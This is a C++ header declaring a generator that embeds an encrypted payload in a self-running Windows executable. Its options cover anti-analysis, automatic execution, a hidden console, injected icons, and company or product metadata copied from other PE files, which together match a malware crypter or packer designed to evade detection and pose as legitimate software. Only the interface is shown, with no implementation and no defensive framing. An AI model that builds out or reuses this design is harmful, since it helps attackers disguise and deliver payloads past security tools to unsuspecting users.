#pragma once

#include <string>
#include <vector>
#include <cstdint>
#include <windows.h>
#include <functional>
#include <map>

// Self-contained executable generator for encrypted payloads
class SelfContainedExecutable {
public:
    struct Config {
        std::string outputPath;
        std::vector<uint8_t> encryptedData;
        std::vector<uint8_t> encryptionKey;
        std::vector<uint8_t> initVector;
        bool antiAnalysis = false;
        bool autoExecute = true;
        bool hideConsole = false;
        std::string iconPath;
        std::string versionInfo;
        std::string companyName;
        std::string productName;
        uint32_t entryPoint = 0;
    };

    // Generate a self-contained executable from an encrypted payload
    static bool Generate(const Config& config, std::string* error = nullptr);

    // Generate a self-contained executable directly from a file
    static bool GenerateFromFile(
        const std::string& inputPath,
        const std::string& outputPath,
        const std::vector<uint8_t>& key,
        const std::vector<uint8_t>& iv,
        bool antiAnalysis = false,
        bool autoExecute = true,
        bool hideConsole = false,
        std::string* error = nullptr);

private:
    // Helper methods
    static bool WriteResourceData(const std::string& outputPath, 
                                  const std::vector<uint8_t>& encryptedData, 
                                  const std::vector<uint8_t>& key, 
                                  const std::vector<uint8_t>& iv,
                                  std::string* error);
    
    static bool InjectIcon(const std::string& exePath, 
                           const std::string& iconPath, 
                           std::string* error);
    
    static bool SetVersionInfo(const std::string& exePath, 
                              const std::string& companyName,
                              const std::string& productName,
                              const std::string& version,
                              std::string* error);
    
    static bool CreateDefaultStubTemplate(const std::string& path, std::string* error);
    
    static std::vector<uint8_t> EncryptData(
        const std::vector<uint8_t>& data,
        const std::vector<uint8_t>& key,
        const std::vector<uint8_t>& iv,
        std::string* error);
    
    static bool IsPEFile(const std::vector<uint8_t>& data);
    
    static std::string ExtractIconFromPE(const std::string& pePath);
    
    static std::map<std::string, std::string> ExtractVersionInfo(const std::string& pePath);
    
    // Constants for resource IDs
    static constexpr int RESOURCE_ENCRYPTED_DATA = 100;
    static constexpr int RESOURCE_ENCRYPTION_KEY = 101;
    static constexpr int RESOURCE_INIT_VECTOR = 102;
    static constexpr int RESOURCE_CONFIG = 103;
};
